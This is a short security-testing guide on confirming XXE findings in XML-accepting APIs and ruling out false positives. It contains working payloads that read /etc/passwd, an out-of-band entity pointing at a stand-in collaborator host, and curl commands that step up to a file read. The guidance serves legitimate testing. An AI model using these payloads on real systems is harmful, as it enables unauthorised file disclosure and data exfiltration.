# XXE False Positive Validation

## Common False Positives

### 1. XML Parser Error ≠ XXE
```bash
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

Response: 400 XML Parse Error
```
A parse error might mean XML is partially processed OR completely rejected. These are different.

**Compare:**
```bash
# Malformed XML (unrelated to XXE):
<root><<<</root> → 400

# XXE attempt:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root> → 400 (same error)
# → Parser likely rejects ALL XML entities, not specifically XXE
```

### 2. Out-of-Band Blind XXE (DNS Only)
External DTD loaded via DNS but no data exfiltration confirmed.
```bash
<!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe.dtd">
```
DNS resolution happens, but if `file://` is disabled, no data is exfiltrated.

**Must show:** Actual file content reaching collaborator, not just DTD fetch.

### 3. Content-Type Not Processed as XML
```bash
Content-Type: application/xml
Body: (XML)
```
If the server ignores Content-Type and parses as JSON, the XML is treated as literal text.

**Confirm:** Test with benign XML first. If accepted, XXE is possible. If rejected, try `text/xml`.

## Confirmation Criteria

| Signal | Confident? |
|--------|------------|
| File content returned in response body | ✅ Confirmed |
| File content exfiltrated via OOB | ✅ Confirmed |
| XML parse error DIFFERENT from malformed XML error | ✅ Strong |
| Same error for all entity types | ❌ Inconclusive |
| XML accepted but entity not processed | ❌ False Positive |

## Validation Flow

```bash
# Step 1: Test if XML is processed
curl -X POST "https://target.com/api/feedback" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root>test</root>'
# 200 → XML accepted

# Step 2: Test entity processing
curl -X POST "https://target.com/api/feedback" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "HELLO">]><root>&test;</root>'
# If "HELLO" appears in response → XXE confirmed

# Step 3: Test file read
curl -X POST "https://target.com/api/feedback" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```
